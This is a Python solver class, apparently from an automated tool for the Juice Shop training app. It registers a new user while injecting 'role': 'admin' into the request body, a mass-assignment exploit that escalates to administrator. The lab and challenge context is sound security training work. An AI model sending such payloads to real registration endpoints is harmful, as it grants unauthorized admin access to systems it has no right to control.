from core.base_solver import BaseSolver
import time
from loguru import logger

class RegisterAdminSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "registerAdminChallenge"

    def solve(self) -> bool:
        # Mass Assignment: Adding "role": "admin" during registration
        email = f"admin_new_{int(time.time())}@juice-sh.op"
        payload = {
            "email": email,
            "password": "Password123",
            "passwordRepeat": "Password123",
            "securityQuestionId": 1,
            "securityAnswer": "test",
            "role": "admin"
        }
        res = self.client.post("/api/Users", json=payload)
        return res.status_code == 201
